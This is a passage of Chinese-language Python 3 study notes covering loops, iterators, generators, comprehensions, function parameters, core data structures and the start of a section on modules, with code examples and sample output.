1 到 100 之和为: 5050
```

### 14-2 无限循环

我们可以通过设置条件表达式永远不为 false 来实现无限循环，实例如下

```python
#!/usr/bin/python3
 
var = 1
while var == 1 :  # 表达式永远为 true
   num = int(input("输入一个数字  :"))
   print ("你输入的数字是: ", num)
 
print ("Good bye!")
```

执行以上脚本，输出结果如下：

```
输入一个数字  :5
你输入的数字是:  5
输入一个数字  :
```

你可以使用 **CTRL+C** 来退出当前的无限循环。

无限循环在服务器上客户端的实时请求非常有用。

### 14-3 while 循环使用 else 语句

在 while … else 在条件语句为 false 时执行 else 的语句块。

语法格式如下：

```
while <expr>:
    <statement(s)>
else:
    <additional_statement(s)>
```

循环输出数字，并判断大小：

```python
#!/usr/bin/python3
 
count = 0
while count < 5:
   print (count, " 小于 5")
   count = count + 1
else:
   print (count, " 大于或等于 5")
```

执行以上脚本，输出结果如下：

```
0  小于 5
1  小于 5
2  小于 5
3  小于 5
4  小于 5
5  大于或等于 5
```

### 14-4 简单语句组

类似if语句的语法，如果你的while循环体中只有一条语句，你可以将该语句与while写在同一行中， 如下所示：

```python
#!/usr/bin/python
 
flag = 1
 
while (flag): print ('欢迎访问菜鸟教程!')
 
print ("Good bye!")
```

**注意：**以上的无限循环你可以使用 CTRL+C 来中断循环。

执行以上脚本，输出结果如下：

```
欢迎访问菜鸟教程!
欢迎访问菜鸟教程!
欢迎访问菜鸟教程!
欢迎访问菜鸟教程!
欢迎访问菜鸟教程!
……
```

### 14-5 for 语句

Python for循环可以遍历任何序列的项目，如一个列表或者一个字符串。

for循环的一般格式如下：

```python
for <variable> in <sequence>:
    <statements>
else:
    <statements>
```

```python
>>>languages = ["C", "C++", "Perl", "Python"] 
>>> for x in languages:
...     print (x)
... 
C
C++
Perl
Python
>>>
```

以下 for 实例中使用了 break 语句，break 语句用于跳出当前循环体：

```python
#!/usr/bin/python3
 
sites = ["Baidu", "Google","Runoob","Taobao"]
for site in sites:
    if site == "Runoob":
        print("菜鸟教程!")
        break
    print("循环数据 " + site)
else:
    print("没有循环数据!")
print("完成循环!")
```

执行脚本后，在循环到 "Runoob"时会跳出循环体：

```python
循环数据 Baidu
循环数据 Google
菜鸟教程!
完成循环!
```

### 14-6 range()函数

如果你需要遍历数字序列，可以使用内置range()函数。它会生成数列，例如:

```python
>>>for i in range(5):
...     print(i)
...
0
1
2
3
4
```

你也可以使用range指定区间的值：

```python
>>>for i in range(5,9) :
    print(i)
 
    
5
6
7
8
>>>
```

也可以使range以指定数字开始并指定不同的增量(甚至可以是负数，有时这也叫做'步长'):

```Python
>>>for i in range(0, 10, 3) :
    print(i)
 
    
0
3
6
9
>>>
```

负数：

```python
>>>for i in range(-10, -100, -30) :
    print(i)
 
    
-10
-40
-70
>>>
```

您可以结合range()和len()函数以遍历一个序列的索引,如下所示:

```python
>>>a = ['Google', 'Baidu', 'Runoob', 'Taobao', 'QQ']
>>> for i in range(len(a)):
...     print(i, a[i])
... 
0 Google
1 Baidu
2 Runoob
3 Taobao
4 QQ
>>>
```

还可以使用range()函数来创建一个列表：

```python
>>>list(range(5))
[0, 1, 2, 3, 4]
>>>
```

### 14-7 break 和 continue 语句及循环中的 else 子句

- **break** 语句可以跳出 for 和 while 的循环体。如果你从 for 或 while 循环中终止，任何对应的循环 else 块将不执行。
- **continue** 语句被用来告诉 Python 跳过当前循环块中的剩余语句，然后继续进行下一轮循环。

while 中使用 break：

```python
n = 5
while n > 0:
    n -= 1
    if n == 2:
        break
    print(n)
print('循环结束。')
```

输出结果为：

```
4
3
循环结束。
```

while 中使用 continue：

```python
n = 5
while n > 0:
    n -= 1
    if n == 2:
        continue
    print(n)
print('循环结束。')
```

输出结果为：

```python
4
3
1
0
循环结束。
```

更多实例如下：

```python
#!/usr/bin/python3
 
for letter in 'Runoob':     # 第一个实例
   if letter == 'b':
      break
   print ('当前字母为 :', letter)
  
var = 10                    # 第二个实例
while var > 0:              
   print ('当期变量值为 :', var)
   var = var -1
   if var == 5:
      break
 
print ("Good bye!")
```

执行以上脚本输出结果为：

```
当前字母为 : R
当前字母为 : u
当前字母为 : n
当前字母为 : o
当前字母为 : o
当期变量值为 : 10
当期变量值为 : 9
当期变量值为 : 8
当期变量值为 : 7
当期变量值为 : 6
Good bye!
```

以下实例循环字符串 Runoob，碰到字母 o 跳过输出：

```python
#!/usr/bin/python3
 
for letter in 'Runoob':     # 第一个实例
   if letter == 'o':        # 字母为 o 时跳过输出
      continue
   print ('当前字母 :', letter)
 
var = 10                    # 第二个实例
while var > 0:              
   var = var -1
   if var == 5:             # 变量为 5 时跳过输出
      continue
   print ('当前变量值 :', var)
print ("Good bye!")
```

执行以上脚本输出结果为：

```
当前字母 : R
当前字母 : u
当前字母 : n
当前字母 : b
当前变量值 : 9
当前变量值 : 8
当前变量值 : 7
当前变量值 : 6
当前变量值 : 4
当前变量值 : 3
当前变量值 : 2
当前变量值 : 1
当前变量值 : 0
Good bye!
```

循环语句可以有 else 子句，它在穷尽列表(以for循环)或条件变为 false (以while循环)导致循环终止时被执行，但循环被 break 终止时不执行。

如下实例用于查询质数的循环例子:

```python
#!/usr/bin/python3
 
for n in range(2, 10):
    for x in range(2, n):
        if n % x == 0:
            print(n, '等于', x, '*', n//x)
            break
    else:
        # 循环中没有找到元素
        print(n, ' 是质数')
```

执行以上脚本输出结果为：

```
2  是质数
3  是质数
4 等于 2 * 2
5  是质数
6 等于 2 * 3
7  是质数
8 等于 2 * 4
9 等于 3 * 3
```

------

### 14-8 pass 语句

Python pass是空语句，是为了保持程序结构的完整性。

pass 不做任何事情，一般用做占位语句，如下实例

```Python
>>>while True:
...     pass  # 等待键盘中断 (Ctrl+C)
```

最小的类:

```python
>>>class MyEmptyClass:
...     pass
```

以下实例在字母为 o 时 执行 pass 语句块:

```python
#!/usr/bin/python3
 
for letter in 'Runoob': 
   if letter == 'o':
      pass
      print ('执行 pass 块')
   print ('当前字母 :', letter)
 
print ("Good bye!")
```

执行以上脚本输出结果为：

```python
当前字母 : R
当前字母 : u
当前字母 : n
执行 pass 块
当前字母 : o
执行 pass 块
当前字母 : o
当前字母 : b
Good bye!
```

## 15，Python3 迭代器与生成器

### 15-1  迭代器

#### 15-1-1  基础知识

1，迭代器：迭代取值的工具，迭代是重复的过程，每一次重复都是基于上次的结果而继续的，单纯的重复不是迭代

```python
# 可迭代对象： 但凡内置有__iter__()方法的都称之为可迭代对象
# 字符串---列表---元祖---字典---集合---文件操作  都是可迭代对象

# 调用可迭代对象下的__iter__方法将其转换为可迭代对象 
d = {'a':1, 'b':2, 'c':3}

d_iter = d.__iter__() # 把字典d转换成了可迭代对象

#   d_iter.__next__()     # 通过__next__()方法可以取值

print(d_iter.__next__()) # a
print(d_iter.__next__()) # b
print(d_iter.__next__()) # c

# 没值了以后就会报错， 抛出异常StopIteration
#-----------------------------------------------
d = {'a':1, 'b':2, 'c':3}
d_iter = d.__iter__()
while True:
	try:
		print(d_iter.__next__())
	except StopIteration:
		break
# 对同一个迭代器对象，取值取干净的情况下第二次取值的时候去不了，没值，只能造新的迭代器
```

#### 15-1-2   迭代器与for循环工作原理

```python
#可迭代对象与迭代器详解
    #可迭代对象：内置有__iter__() 方法对象
        # 可迭代对象.__iter__(): 得到可迭代对象
        
    #迭代器对象：内置有__next__() 方法
    	# 迭代器对象.__next__()：得到迭代器的下一个值
        # 迭代器对象.__iter__(): 得到的值迭代器对象的本身（调跟没调一个样）-----------> 为了保证for循环的工作
        
# for循环工作原理
    d = {'a':1, 'b':2, 'c':3}
    d_iter = d.__iter__()

    # 1，d.__iter__() 方法得到一个跌倒器对象
    # 2,迭代器对象的__next__()方法拿到返回值，将该返回值赋值给k
    # 3,循环往复步骤2，直到抛出异常，for循环会捕捉异常并结束循坏

    for k in d:
        print(k)
        
    # 可迭代器对象不一定是迭代器对象------------迭代器对象一定是可迭代对象
    # 字符串---列表---元祖---字典---集合只是可迭代对象，不是迭代器对象、
    # 文件操作时迭代器对象也是可迭代对象
```

### 15-2  生成器（本质就是迭代器）

```python
# 函数里包含yield,并且调用函数以后就能得到一个可迭代对象
def test():
	print('第一次')
	yield 1
	print('第二次')
	yield 2
	print('第三次')
	yield 3
	print('第四次')

g = test()
print(g) # <generator object test at 0x0000014C809A27A0>
g_iter = g.__iter__()
res1 = g_iter.__next__() # 第一次
print(res1) # 1
res2 = g_iter.__next__() # 第二次
print(res2) # 2
res3 = g_iter.__next__() # 第三次
print(res3) # 3  

# 补充
len(s) -------> s.__len__()
next(s) ------> s.__next__()
iter(d) -------> d.__iter__()
```

#### 15-2-1 yield 表达式

```Python
def person(name):
	print("%s吃东西啦！！"%name)
	while True:
		x = yield None
		print('%s吃东西啦---%s'%(name,x))


g = person('aini')
# next(g) =============== g.send(None)
next(g)
next(g)
# send()方法可以给yield传值
# 不能在第一次运行时用g.send()来传值，需要用g.send(None)或者next(g) 来初始化，第二次开始可以用g.send("值")来传值
g.send("雪糕")  # aini吃东西啦---雪糕
g.send("西瓜")  # aini吃东西啦---西瓜
```

#### 15-2-2  三元表达式

```python
x = 10
y = 20
res = x if x > y else y
# 格式
条件成立时返回的值 if 条件 else 条件不成立时返回的值
```

#### 15-2-3  列表生成式

```python
l = ['aini_aaa','dilnur_aaa','donghua_aaa','egon']
res = [name for name in l if name.endswith('aaa')]
print(res)

# 语法： [结果 for 元素 in 可迭代对象 if 条件]


l = ['aini_aaa','dilnur_aaa','donghua_aaa','egon']
l = [name.upper() for name in l]
print(l)

l = ['aini_aaa','dilnur_aaa','donghua_aaa','egon']
l = [name.replace('_aaa','') for name in l if name.endswith('_aaa')]
print(l)
```

#### 15-2-4 其他生成器（——没有元祖生成式——）

```python
### 字典生成器
keys = ['name','age','gender']
res = {key: None for key in keys}
print(res)  # {'name': None, 'age': None, 'gender': None}

items = [('name','aini'),('age',22),('gender','man')]
res = {k:v for k,v in items}
print(res)

## 集合生成器
keys = ['name','age','gender']
set1 = {key for key in keys}

## 没有元祖生成器
g = (i for i in range(10) if i % 4 == 0 )  ## 得到的是一个迭代器


#### 统计文件字符个数
with open('aini.txt', mode='rt', encoding= 'utf-8') as f:
    res = sum(len(line) for line in f)
    print(res)
```

#### 15-2-5 二分法

```python
l = [-10,-6,-3,0,1,10,56,134,222,234,532,642,743,852,1431]

def search_num(num,list):
	mid_index = len(list) // 2
	if len(list) == 0:
		print("没找到")
		return False
	if num > list[mid_index]:
		list = list[mid_index + 1 :]
		search_num(num,list)
	elif num < list[mid_index]:
		list = list[:mid_index]
		search_num(num, list)
	else:
		print('找到了' , list[mid_index])

search_num(743,l)
```

#### 15-2-6 匿名函数与lambdaj

```python
## 定义
res = lambda x,y : x+y
## 调用
(lambda x,y : x+y)(10,20)  # 第一种方法
res(10,20)    ## 第二种方法

##应用场景
salary = {
    'aini':20000,
    'aili':50000,
    'dilnur':15000,
    'hahhaha':42568,
    'fdafdaf':7854
}

res = max(salary ,key= lambda x : salary[x])
print(res)
```

## 16，Python3 函数

函数是组织好的，可重复使用的，用来实现单一，或相关联功能的代码段。

函数能提高应用的模块性，和代码的重复利用率。你已经知道Python提供了许多内建函数，比如print()。但你也可以自己创建函数，这被叫做用户自定义函数。

------

### 16-1 定义一个函数

你可以定义一个由自己想要功能的函数，以下是简单的规则：

- 函数代码块以 **def** 关键词开头，后接函数标识符名称和圆括号 **()**。
- 任何传入参数和自变量必须放在圆括号中间，圆括号之间可以用于定义参数。
- 函数的第一行语句可以选择性地使用文档字符串—用于存放函数说明。
- 函数内容以冒号起始，并且缩进。
- **return [表达式]** 结束函数，选择性地返回一个值给调用方。不带表达式的return相当于返回 None。

------

**语法**

Python 定义函数使用 def 关键字，一般格式如下：

```
def 函数名（参数列表）:
    函数体
```

默认情况下，参数值和参数名称是按函数声明中定义的顺序匹配起来的。

让我们使用函数来输出"Hello World！"：

```python
>>>def hello() :
   print("Hello World!")
 
   
>>> hello()
Hello World!
>>>
```

更复杂点的应用，函数中带上参数变量:

```python
#!/usr/bin/python3
 
# 计算面积函数
def area(width, height):
    return width * height
 
def print_welcome(name):
    print("Welcome", name)
 
print_welcome("Runoob")
w = 4
h = 5
print("width =", w, " height =", h, " area =", area(w, h))
```

以上实例输出结果：

```
Welcome Runoob
width = 4  height = 5  area = 20
```

### 16-2 函数调用

定义一个函数：给了函数一个名称，指定了函数里包含的参数，和代码块结构。

这个函数的基本结构完成以后，你可以通过另一个函数调用执行，也可以直接从 Python 命令提示符执行。

如下实例调用了 **printme()** 函数：

```python
#!/usr/bin/python3
 
# 定义函数
def printme( str ):
   # 打印任何传入的字符串
   print (str)
   return
 
# 调用函数
printme("我要调用用户自定义函数!")
printme("再次调用同一函数")
```

以上实例输出结果：

```
我要调用用户自定义函数!
再次调用同一函数
```

### 16-3 参数传递

在 python 中，类型属于对象，变量是没有类型的：

```
a=[1,2,3]

a="Runoob"
```

以上代码中，**[1,2,3]** 是 List 类型，**"Runoob"** 是 String 类型，而变量 a 是没有类型，她仅仅是一个对象的引用（一个指针），可以是指向 List 类型对象，也可以是指向 String 类型对象。

### 16-4 可更改(mutable)与不可更改(immutable)对象

在 python 中，strings, tuples, 和 numbers 是不可更改的对象，而 list,dict 等则是可以修改的对象。

- **不可变类型：**变量赋值 **a=5** 后再赋值 **a=10**，这里实际是新生成一个 int 值对象 10，再让 a 指向它，而 5 被丢弃，不是改变a的值，相当于新生成了a。
- **可变类型：**变量赋值 **la=[1,2,3,4]** 后再赋值 **la[2]=5** 则是将 list la 的第三个元素值更改，本身la没有动，只是其内部的一部分值被修改了。

python 函数的参数传递：

- **不可变类型：**类似 c++ 的值传递，如 整数、字符串、元组。如fun（a），传递的只是a的值，没有影响a对象本身。比如在 fun（a）内部修改 a 的值，只是修改另一个复制的对象，不会影响 a 本身。
- **可变类型：**类似 c++ 的引用传递，如 列表，字典。如 fun（la），则是将 la 真正的传过去，修改后fun外部的la也会受影响

python 中一切都是对象，严格意义我们不能说值传递还是引用传递，我们应该说传不可变对象和传可变对象。

### 16-5 python 传不可变对象实例

```python
#!/usr/bin/python3
 
def ChangeInt( a ):
    a = 10
 
b = 2
ChangeInt(b)
print( b ) # 结果是 2
```

实例中有 int 对象 2，指向它的变量是 b，在传递给 ChangeInt 函数时，按传值的方式复制了变量 b，a 和 b 都指向了同一个 Int 对象，在 a=10 时，则新生成一个 int 值对象 10，并让 a 指向它。

### 16-6 传可变对象实例

可变对象在函数里修改了参数，那么在调用这个函数的函数里，原始的参数也被改变了。例如：

```python
#!/usr/bin/python3
 
# 可写函数说明
def changeme( mylist ):
   "修改传入的列表"
   mylist.append([1,2,3,4])
   print ("函数内取值: ", mylist)
   return
 
# 调用changeme函数
mylist = [10,20,30]
changeme( mylist )
print ("函数外取值: ", mylist)
```

传入函数的和在末尾添加新内容的对象用的是同一个引用。故输出结果如下：

```python
函数内取值:  [10, 20, 30, [1, 2, 3, 4]]
函数外取值:  [10, 20, 30, [1, 2, 3, 4]]
```

### 16-7 函数参数详解

#### 16-7-1  位置参数--------关键字参数---------混合使用

```Python
1，位置实参:在函数调用阶段， 按照从左到有的顺序依次传入的值
# 特点：按照顺序与形参一一对应

2 关键字参数
# 关键字实参：在函数调用阶段，按照key=value的形式传入的值
# 特点：指名道姓给某个形参传值，可以完全不参照顺序
def func(x,y):
	print(x,y)

func(y=2,x=1) # 关键字参数
func(1,2)  # 位置参数

3，混合使用，强调
    # 1、位置实参必须放在关键字实参前
        def func(x,y):
            print(x,y)
        func(1,y=2)
        func(y=2,1)

    # 2、不能能为同一个形参重复传值
        def func(x,y):
            print(x,y)
        func(1,y=2,x=3)
        func(1,2,x=3,y=4)
```

#### 16-7-2   默认参数------位置参数与默认参数混用

```Python
4，默认参数
    # 默认形参：在定义函数阶段，就已经被赋值的形参，称之为默认参数
    # 特点：在定义阶段就已经被赋值，意味着在调用阶段可以不用为其赋值
        def func(x,y=3):
            print(x,y)

        func(x=1)
        func(x=1,y=44444)


        def register(name,age,gender='男'):
             print(name,age,gender)

        register('三炮',18)
        register('二炮',19)	
        register('大炮',19)
        register('没炮',19,'女')


5，位置形参与默认形参混用，强调：
    # 1、位置形参必须在默认形参的左边
          def func(y=2,x):  # 错误写法
                pass

    # 2、默认参数的值是在函数定义阶段被赋值的，准确地说被赋予的是值的内存地址
    # 示范1：
        m=2
        def func(x,y=m): # y=>2的内存地址
            print(x,y）
        m=3333333333333333333
        func(1)

    # 3、虽然默认值可以被指定为任意数据类型，但是不推荐使用可变类型
    # 函数最理想的状态：函数的调用只跟函数本身有关系，不外界代码的影响
        m = [111111, ]

        def func(x, y=m):
        print(x, y)

        m.append(3333333)
        m.append(444444)
        m.append(5555)

        func(1)
        func(2)
        func(3)

       def func(x,y,z,l=None):
           if l is None:
               l=[]
               l.append(x)
               l.append(y)
               l.append(z)
            print(l)

       func(1,2,3)
       func(4,5,6)

       new_l=[111,222]
       func(1,2,3,new_l)
```

#### 16-7-3  可变长度的参数

```Python
6，可变长度的参数（*与**的用法）
    # 可变长度指的是在调用函数时，传入的值（实参）的个数不固定
    # 而实参是用来为形参赋值的，所以对应着，针对溢出的实参必须有对应的形参来接收

6.1 可变长度的位置参数
    # I：*形参名：用来接收溢出的位置实参，溢出的位置实参会被*保存成元组的格式然后赋值紧跟其后的形参名
        # *后跟的可以是任意名字，但是约定俗成应该是args

        def func(x,y,*z): # z =（3,4,5,6）
            print(x,y,z)

        func(1,2,3,4,5,6)

        def my_sum(*args):
               res=0
               for item in args:
                    res+=item
                return res

            res=my_sum(1,2,3,4,)
            print(res)

    # II: *可以用在实参中，实参中带*，先*后的值打散成位置实参
        def func(x,y,z):
            print(x,y,z)
   
        func(*[11,22,33]) # func(11，22，33)
        func(*[11,22]) # func(11，22)
       
        l=[11,22,33]
        func(*l)

    # III: 形参与实参中都带*
        def func(x,y,*args): # args=(3,4,5,6)
            print(x,y,args)

        func(1,2,[3,4,5,6])
        func(1,2,*[3,4,5,6]) # func(1,2,3,4,5,6)
        func(*'hello') # func('h','e','l','l','o')


6.2 可变长度的关键字参数
    # I：**形参名：用来接收溢出的关键字实参，**会将溢出的关键字实参保存成字典格式，然后赋值给紧跟其后的形参名
        # **后跟的可以是任意名字，但是约定俗成应该是kwargs
        def func(x,y,**kwargs):
            print(x,y,kwargs)
       
        func(1,y=2,a=1,b=2,c=3)

    # II: **可以用在实参中(**后跟的只能是字典)，实参中带**，先**后的值打散成关键字实参
        def func(x,y,z):
            print(x,y,z)

        func(*{'x':1,'y':2,'z':3}) # func('x','y','z')
        func(**{'x':1,'y':2,'z':3}) # func(x=1,y=2,z=3)

    # 错误
        func(**{'x':1,'y':2,}) # func(x=1,y=2)
        func(**{'x':1,'a':2,'z':3}) # func(x=1,a=2,z=3)


    # III: 形参与实参中都带**
        def func(x,y,**kwargs):
           print(x,y,kwargs)

        func(y=222,x=111,a=333,b=444)
        func(**{'y':222,'x':111,'a':333,'b':4444})

    # 混用*与**：*args必须在**kwargs之前
        def func(x,*args,**kwargs):
            print(args)
            print(kwargs)
       
        func(1,2,3,4,5,6,7,8,x=1,y=2,z=3)


    def index(x,y,z):
        print('index=>>> ',x,y,z)

    def wrapper(*args,**kwargs): #args=(1,) kwargs={'z':3,'y':2}
        index(*args,**kwargs)
        # index(*(1,),**{'z':3,'y':2})
        # index(1,z=3,y=2)

    wrapper(1,z=3,y=2) # 为wrapper传递的参数是给index用的
```

#### 16-7-4  函数的类型提示

```python
## : 后面是提示信息，可以随意写
def regidter(name:"不能写艾尼",age:"至少18岁")：
	print(name)
    print(age)
    
def register(name:str,age:int,hobbies:tuple)->int:  #  返回值类型为 int
    print(name)
    print(age)
    print(hobbies)
 
# 添加提示功能的同时，再添加默认值
def register(name:str = 'aini',age:int = 18 ,hobbies:tuple)->int:  #  返回值类型为 int
    print(name)
    print(age)
    print(hobbies)
```

## 17，Python3 数据结构

### 17-1 列表

Python中列表是可变的，这是它区别于字符串和元组的最重要的特点，一句话概括即：列表可以修改，而字符串和元组不能。

以下是 Python 中列表的方法：

![image-20240229124005507](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229124005507.png)

下面示例演示了列表的大部分方法：

```Python
>>> a = [66.25, 333, 333, 1, 1234.5]
>>> print(a.count(333), a.count(66.25), a.count('x'))
2 1 0
>>> a.insert(2, -1)
>>> a.append(333)
>>> a
[66.25, 333, -1, 333, 1, 1234.5, 333]
>>> a.index(333)
1
>>> a.remove(333)
>>> a
[66.25, -1, 333, 1, 1234.5, 333]
>>> a.reverse()
>>> a
[333, 1234.5, 1, 333, -1, 66.25]
>>> a.sort()
>>> a
[-1, 1, 66.25, 333, 333, 1234.5]
```

注意：类似 insert, remove 或 sort 等修改列表的方法没有返回值。

------

### 17-2 将列表当做堆栈使用

列表方法使得列表可以很方便的作为一个堆栈来使用，堆栈作为特定的数据结构，最先进入的元素最后一个被释放（后进先出）。用 append() 方法可以把一个元素添加到堆栈顶。用不指定索引的 pop() 方法可以把一个元素从堆栈顶释放出来。例如：

```python
>>> stack = [3, 4, 5]
>>> stack.append(6)
>>> stack.append(7)
>>> stack
[3, 4, 5, 6, 7]
>>> stack.pop()
7
>>> stack
[3, 4, 5, 6]
>>> stack.pop()
6
>>> stack.pop()
5
>>> stack
[3, 4]
```

### 17-3 将列表当作队列使用

也可以把列表当做队列用，只是在队列里第一加入的元素，第一个取出来；但是拿列表用作这样的目的效率不高。在列表的最后添加或者弹出元素速度快，然而在列表里插入或者从头部弹出速度却不快（因为所有其他的元素都得一个一个地移动）。

```python
>>> from collections import deque
>>> queue = deque(["Eric", "John", "Michael"])
>>> queue.append("Terry")           # Terry arrives
>>> queue.append("Graham")          # Graham arrives
>>> queue.popleft()                 # The first to arrive now leaves
'Eric'
>>> queue.popleft()                 # The second to arrive now leaves
'John'
>>> queue                           # Remaining queue in order of arrival
deque(['Michael', 'Terry', 'Graham'])
```

### 17-4 列表推导式

- 列表推导式提供了从序列创建列表的简单途径。通常应用程序将一些操作应用于某个序列的每个元素，用其获得的结果作为生成新列表的元素，或者根据确定的判定条件创建子序列。
- 每个列表推导式都在 for 之后跟一个表达式，然后有零到多个 for 或 if 子句。返回结果是一个根据表达从其后的 for 和 if 上下文环境中生成出来的列表。如果希望表达式推导出一个元组，就必须使用括号。
- 这里我们将列表中每个数值乘三，获得一个新的列表：

```python
>>> vec = [2, 4, 6]
>>> [3*x for x in vec]
[6, 12, 18]
```

现在我们玩一点小花样：

```python
>>> [[x, x**2] for x in vec]
[[2, 4], [4, 16], [6, 36]]
```

这里我们对序列里每一个元素逐个调用某方法：

```python
>>> freshfruit = ['  banana', '  loganberry ', 'passion fruit  ']
>>> [weapon.strip() for weapon in freshfruit]
['banana', 'loganberry', 'passion fruit']
```

我们可以用 if 子句作为过滤器：

```python
>>> [3*x for x in vec if x > 3]
[12, 18]
>>> [3*x for x in vec if x < 2]
[]
```

以下是一些关于循环和其它技巧的演示：

```python
>>> vec1 = [2, 4, 6]
>>> vec2 = [4, 3, -9]
>>> [x*y for x in vec1 for y in vec2]
[8, 6, -18, 16, 12, -36, 24, 18, -54]
>>> [x+y for x in vec1 for y in vec2]
[6, 5, -7, 8, 7, -5, 10, 9, -3]
>>> [vec1[i]*vec2[i] for i in range(len(vec1))]
[8, 12, -54]
```

列表推导式可以使用复杂表达式或嵌套函数：

```python
>>> [str(round(355/113, i)) for i in range(1, 6)]
['3.1', '3.14', '3.142', '3.1416', '3.14159']
```

### 17-5 嵌套列表解析

Python的列表还可以嵌套。

以下实例展示了3X4的矩阵列表：

```python
>>> matrix = [
...     [1, 2, 3, 4],
...     [5, 6, 7, 8],
...     [9, 10, 11, 12],
... ]
```

以下实例将3X4的矩阵列表转换为4X3列表：

```python
>>> [[row[i] for row in matrix] for i in range(4)]
[[1, 5, 9], [2, 6, 10], [3, 7, 11], [4, 8, 12]]
```

以下实例也可以使用以下方法来实现：

```python
>>> transposed = []
>>> for i in range(4):
...     transposed.append([row[i] for row in matrix])
...
>>> transposed
[[1, 5, 9], [2, 6, 10], [3, 7, 11], [4, 8, 12]]
```

另外一种实现方法：

```python
>>> transposed = []
>>> for i in range(4):
...     # the following 3 lines implement the nested listcomp
...     transposed_row = []
...     for row in matrix:
...         transposed_row.append(row[i])
...     transposed.append(transposed_row)
...
>>> transposed
[[1, 5, 9], [2, 6, 10], [3, 7, 11], [4, 8, 12]]
```

### 17-6 del 语句

使用 del 语句可以从一个列表中依索引而不是值来删除一个元素。这与使用 pop() 返回一个值不同。可以用 del 语句从列表中删除一个切割，或清空整个列表（我们以前介绍的方法是给该切割赋一个空列表）。例如：

```python
>>> a = [-1, 1, 66.25, 333, 333, 1234.5]
>>> del a[0]
>>> a
[1, 66.25, 333, 333, 1234.5]
>>> del a[2:4]
>>> a
[1, 66.25, 1234.5]
>>> del a[:]
>>> a
[]
```

也可以用 del 删除实体变量：

```
>>> del a
```

------

### 17-7 元组和序列

元组由若干逗号分隔的值组成，例如：

```python
>>> t = 12345, 54321, 'hello!'
>>> t[0]
12345
>>> t
(12345, 54321, 'hello!')
>>> # Tuples may be nested:
... u = t, (1, 2, 3, 4, 5)
>>> u
((12345, 54321, 'hello!'), (1, 2, 3, 4, 5))
```

如你所见，元组在输出时总是有括号的，以便于正确表达嵌套结构。在输入时可能有或没有括号， 不过括号通常是必须的（如果元组是更大的表达式的一部分）

### 17-8 集合

- 集合是一个无序不重复元素的集。基本功能包括关系测试和消除重复元素。
- 可以用大括号({})创建集合。注意：如果要创建一个空集合，你必须用 set() 而不是 {} ；后者创建一个空的字典，下一节我们会介绍这个数据结构。

以下是一个简单的演示：

```python
>>> basket = {'apple', 'orange', 'apple', 'pear', 'orange', 'banana'}
>>> print(basket)                      # 删除重复的
{'orange', 'banana', 'pear', 'apple'}
>>> 'orange' in basket                 # 检测成员
True
>>> 'crabgrass' in basket
False

>>> # 以下演示了两个集合的操作
...
>>> a = set('abracadabra')
>>> b = set('alacazam')
>>> a                                  # a 中唯一的字母
{'a', 'r', 'b', 'c', 'd'}
>>> a - b                              # 在 a 中的字母，但不在 b 中
{'r', 'd', 'b'}
>>> a | b                              # 在 a 或 b 中的字母
{'a', 'c', 'r', 'd', 'b', 'm', 'z', 'l'}
>>> a & b                              # 在 a 和 b 中都有的字母
{'a', 'c'}
>>> a ^ b                              # 在 a 或 b 中的字母，但不同时在 a 和 b 中
{'r', 'd', 'b', 'm', 'z', 'l'}
```

集合也支持推导式：

```python
>>> a = {x for x in 'abracadabra' if x not in 'abc'}
>>> a
{'r', 'd'}
```

### 17-9 字典

- 另一个非常有用的 Python 内建数据类型是字典。
- 序列是以连续的整数为索引，与此不同的是，字典以关键字为索引，关键字可以是任意不可变类型，通常用字符串或数值。
- 理解字典的最佳方式是把它看做无序的键=>值对集合。在同一个字典之内，关键字必须是互不相同。
- 一对大括号创建一个空的字典：{}。

这是一个字典运用的简单例子：

```python
>>> tel = {'jack': 4098, 'sape': 4139}
>>> tel['guido'] = 4127
>>> tel
{'sape': 4139, 'guido': 4127, 'jack': 4098}
>>> tel['jack']
4098
>>> del tel['sape']
>>> tel['irv'] = 4127
>>> tel
{'guido': 4127, 'irv': 4127, 'jack': 4098}
>>> list(tel.keys())
['irv', 'guido', 'jack']
>>> sorted(tel.keys())
['guido', 'irv', 'jack']
>>> 'guido' in tel
True
>>> 'jack' not in tel
False
```

构造函数 dict() 直接从键值对元组列表中构建字典。如果有固定的模式，列表推导式指定特定的键值对：

```python
>>> dict([('sape', 4139), ('guido', 4127), ('jack', 4098)])
{'sape': 4139, 'jack': 4098, 'guido': 4127}
```

此外，字典推导可以用来创建任意键和值的表达式词典：

```python
>>> {x: x**2 for x in (2, 4, 6)}
{2: 4, 4: 16, 6: 36}
```

如果关键字只是简单的字符串，使用关键字参数指定键值对有时候更方便：

```Python
>>> dict(sape=4139, guido=4127, jack=4098)
{'sape': 4139, 'jack': 4098, 'guido': 4127}
```

### 17-10 遍历技巧

在字典中遍历时，关键字和对应的值可以使用 items() 方法同时解读出来：

```python
>>> knights = {'gallahad': 'the pure', 'robin': 'the brave'}
>>> for k, v in knights.items():
...     print(k, v)
...
gallahad the pure
robin the brave
```

在序列中遍历时，索引位置和对应值可以使用 enumerate() 函数同时得到：

```python
>>> for i, v in enumerate(['tic', 'tac', 'toe']):
...     print(i, v)
...
0 tic
1 tac
2 toe
```

同时遍历两个或更多的序列，可以使用 zip() 组合：

```python
>>> questions = ['name', 'quest', 'favorite color']
>>> answers = ['lancelot', 'the holy grail', 'blue']
>>> for q, a in zip(questions, answers):
...     print('What is your {0}?  It is {1}.'.format(q, a))
...
What is your name?  It is lancelot.
What is your quest?  It is the holy grail.
What is your favorite color?  It is blue.
```

要反向遍历一个序列，首先指定这个序列，然后调用 reversed() 函数：

```python
>>> for i in reversed(range(1, 10, 2)):
...     print(i)
...
9
7
5
3
1
```

要按顺序遍历一个序列，使用 sorted() 函数返回一个已排序的序列，并不修改原值

```python
>>> basket = ['apple', 'orange', 'apple', 'pear', 'orange', 'banana']
>>> for f in sorted(set(basket)):
...     print(f)
...
apple
banana
orange
pear
```

## 18，Python3 模块

### 18-1  模块

```python
## 内置模块
## 第三方模块
## 自定义模块

## 模块的四种形式
1， 使用Python编写的py文件
2， 已被编译为共享库或DLL的C或C++扩展
3， 把一系列模块组织到一起的文件夹（文件夹下面有个__init__.py 该文件夹称为包）
3， 使用C编写并链接到Python解释器的内置模块

import foo
## 首次导入模块会发生什么？
1，执行foo.py
2, 产生foo.py的命名空间
3，在当前文件中产生的有一个名字foo,改名字指向2中产生的命名空间

## 无论是调用还是修改与源模块为准，与调用位置无关

## 导入模块规范
1 Python内置模块
2，Python第三方模块
3，自定义模块

## 起别名

import foo as f

## 自定义模块命名应该纯小写+下划线

